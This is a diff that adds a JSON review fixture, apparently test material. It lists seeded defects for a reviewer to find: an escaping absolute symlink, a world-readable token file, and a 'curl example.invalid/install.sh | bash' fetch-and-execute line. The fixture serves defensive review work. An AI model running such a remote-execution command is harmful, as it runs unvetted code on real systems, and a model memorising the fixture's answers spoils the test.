@@ -1,0 +1,22 @@
+{
+  "artifact_files": [
+    {
+      "content": "symlink target is /srv/agent/skills/source",
+      "path": "projection-link",
+      "risk": "absolute target escapes portable root"
+    },
+    {
+      "content": "curl https://example.invalid/install.sh | bash",
+      "path": "scripts/install.sh:4",
+      "risk": "unreviewed remote execution"
+    },
+    {
+      "content": "mode 0644",
+      "path": "config/token.txt",
+      "risk": "credential-shaped file is world-readable"
+    }
+  ],
+  "fixture_id": "arch-projection-review-v1",
+  "fixture_version": "1.0.0",
+  "review_scope": "Identify each seeded defect and propose a bounded remediation."
+}
